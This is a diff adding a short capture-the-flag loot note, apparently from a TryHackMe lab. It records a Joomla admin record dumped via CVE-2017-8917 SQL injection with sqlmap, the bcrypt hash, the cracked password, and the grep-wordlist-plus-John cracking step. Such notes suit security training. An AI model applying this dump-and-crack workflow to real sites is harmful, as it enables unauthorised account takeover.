@@ -1,0 +1,10 @@
+Extracted via CVE-2017-8917 SQL injection (sqlmap) from joomla.#__users
+Date: 2026-11-20
+
+name       : Super User
+username   : jonah
+password   : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm   (bcrypt, cost 10)
+email      : jonah@tryhackme.com
+
+Cracked password: spiderman123   (jonah:spiderman123)
+Method: targeted wordlist — grep -i spider rockyou.txt > spider.txt (context: Spider-Man theme), John cracked in <1s.
